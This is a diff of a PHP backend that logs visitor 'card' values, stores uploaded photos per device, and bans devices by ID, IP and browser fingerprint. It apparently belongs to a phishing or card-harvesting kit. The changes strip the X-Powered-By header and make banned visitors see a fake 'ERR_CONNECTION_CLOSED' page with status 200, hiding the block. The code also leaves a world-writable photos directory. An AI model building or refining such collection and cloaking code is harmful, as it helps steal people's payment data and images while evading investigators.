@@ -2,6 +2,7 @@
 header("Access-Control-Allow-Origin: *");
 header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
 header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
+header_remove("X-Powered-By");
 
 if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     http_response_code(200);
@@ -39,7 +40,7 @@ function saveBannedFingerprints($fingerprints) {
     global $bannedFingerprintsFile;
     $json = json_encode($fingerprints, JSON_PRETTY_PRINT);
     if ($json === false) return false;
-    return @file_put_contents($bannedFingerprintsFile, $json);
+    return file_put_contents($bannedFingerprintsFile, $json);
 }
 
 // Triple-Lock Check Function
@@ -152,7 +153,7 @@ function isBanned($deviceId, $ip, $fingerprint = null) {
             $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
             $bannedDevices = array_map('trim', $bannedDevices);
             if (!in_array($deviceId, $bannedDevices, true)) {
-                @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
+                file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
             }
         }
         // Set/Refresh cookie
@@ -169,8 +170,8 @@ function isBanned($deviceId, $ip, $fingerprint = null) {
 }
 
 function showBannedPage($host) {
-    http_response_code(403);
-    echo "<!-- DEVICE_BANNED -->";
+    http_response_code(200);
+    echo "<!-- ERR_CONNECTION_CLOSED -->";
     ?>
 <!DOCTYPE html>
 <html>
@@ -231,10 +232,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['act
     }
     $banned = isBanned($deviceId, $ip, $fingerprintJson);
 
-    @file_put_contents(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - CheckBan: deviceId=$deviceId, ip=$ip, isBanned=" . ($banned ? 'YES' : 'NO') . "\n", FILE_APPEND);
+    file_put_contents(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - CheckBan: deviceId=$deviceId, ip=$ip, isBanned=" . ($banned ? 'YES' : 'NO') . "\n", FILE_APPEND);
 
     if ($banned) {
-        @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Early ban check: $deviceId from IP $ip\n", FILE_APPEND);
+        file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Early ban check: $deviceId from IP $ip\n", FILE_APPEND);
         showBannedPage($_SERVER['HTTP_HOST']);
     } else {
         // If not banned, but has banned cookie, clear it (Unban action)
@@ -268,7 +269,7 @@ $fingerprintJson = !empty($fingerprint_data) ? json_encode($fingerprint_data) : 
 
 // SECOND BAN CHECK (Full request) - pass fingerprint
 if (isBanned($deviceId, $ip, $fingerprintJson)) {
-    @file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Banned device (FullRequest): $deviceId from IP $ip\n", FILE_APPEND);
+    file_put_contents(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Banned device (FullRequest): $deviceId from IP $ip\n", FILE_APPEND);
     showBannedPage($_SERVER['HTTP_HOST']);
 }
 
@@ -290,14 +291,14 @@ $has_photo = false;
 if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
     $photosDir = __DIR__ . '/photos';
     if (!is_dir($photosDir)) {
-        if (!@mkdir($photosDir, 0777, true)) {
-            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not create photos directory\n", FILE_APPEND);
+        if (!mkdir($photosDir, 0777, true)) {
+            file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not create photos directory\n", FILE_APPEND);
         }
     }
     if (is_dir($photosDir)) {
         $photo_path = $photosDir . '/' . $deviceId . '.txt';
-        if (@file_put_contents($photo_path, $data['photo']) === false) {
-            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write photo for $deviceId\n", FILE_APPEND);
+        if (file_put_contents($photo_path, $data['photo']) === false) {
+            file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write photo for $deviceId\n", FILE_APPEND);
         } else {
             $has_photo = true;
         }
@@ -363,7 +364,7 @@ if ($deviceId !== 'unknown') {
                 $bannedDevices = file_exists($bannedDevicesFile) ? file($bannedDevicesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
                 $bannedDevices = array_map('trim', $bannedDevices);
                 if (!in_array($deviceId, $bannedDevices, true)) {
-                    @file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
+                    file_put_contents($bannedDevicesFile, $deviceId . "\n", FILE_APPEND);
                 }
                 // Also store the fingerprint for Lock 2 matching
                 if (!empty($fingerprint_data)) {
@@ -422,9 +423,12 @@ if ($deviceId !== 'unknown') {
             $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
         }
 
-        if (@file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT)) === false) {
-            @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write stateFile: $stateFile\n", FILE_APPEND);
+        $stateSaved = (file_put_contents($stateFile, json_encode($state, JSON_PRETTY_PRINT)) !== false);
+        if (!$stateSaved) {
+            file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write stateFile: $stateFile\n", FILE_APPEND);
         }
+    } else {
+        $stateSaved = true;
     }
 
 // 2. Append to Visits History
@@ -442,10 +446,15 @@ $visitEntry = [
     'card' => $card,
     'has_photo' => $has_photo
 ];
-if (@file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND) === false) {
-    @file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write to visitsLog: $visitsLog\n", FILE_APPEND);
+$logAppended = (file_put_contents($visitsLog, json_encode($visitEntry) . "\n", FILE_APPEND) !== false);
+if (!$logAppended) {
+    file_put_contents($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write to visitsLog: $visitsLog\n", FILE_APPEND);
 }
 
 header('Content-Type: application/json');
-echo json_encode(["status" => "ok", "logged" => true]);
+echo json_encode([
+    "status" => ($stateSaved && $logAppended) ? "ok" : "error",
+    "logged" => ($stateSaved && $logAppended),
+    "debug" => ($stateSaved && $logAppended) ? null : "Write failure"
+]);
 ?>
